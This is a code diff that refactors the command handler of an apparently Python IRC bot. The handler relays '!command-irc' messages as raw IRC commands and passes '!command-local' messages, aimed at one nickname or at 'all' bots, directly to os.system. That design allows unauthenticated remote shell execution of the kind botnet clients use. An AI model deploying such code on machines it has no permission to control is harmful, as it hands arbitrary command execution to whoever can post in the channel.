@@ -29,22 +29,18 @@ def commands():
         print("Recieved.")
         if ":!command-irc " + nickname in recieved:
             msgToSend = recieved.split(":!command-irc " + nickname)[1] # get the command from the message
-            msgToSend = msgToSend[:len(msgToSend)-2].split(" ")
-            irc.send((msgToSend[0].upper() + " " + " ".join(msgToSend[1:]) + "\r\n").encode(encoding="UTF-8")) # prepare and send the command
         else:
             msgToSend = recieved.split(":!command-irc all ")[1] # get the command from the message
-            msgToSend = msgToSend[:len(msgToSend)-2].split(" ")
-            irc.send((msgToSend[0].upper() + " " + " ".join(msgToSend[1:]) + "\r\n").encode(encoding="UTF-8")) # prepare and send the command
+        msgToSend = msgToSend[:len(msgToSend)-2].split(" ")
+        irc.send((msgToSend[0].upper() + " " + " ".join(msgToSend[1:]) + "\r\n").encode(encoding="UTF-8")) # prepare and send the command
 
     if ":!command-local" + nickname in recieved or ":!command-local all" in recieved:
         if ":!command-local all" in recieved:
             command = recieved.split(":!command-local all ")[1]
-            command = command[:len(command)-2]
-            os.system(command)
         else:
             command = recieved.split(nickname + " ")[1]
-            command = command[:len(command)-2]
-            os.system(command)
+        command = command[:len(command)-2]
+        os.system(command)
 
     if ":!ping " + nickname in recieved or ":!ping all" in recieved:
         sendMsg("Pong!")
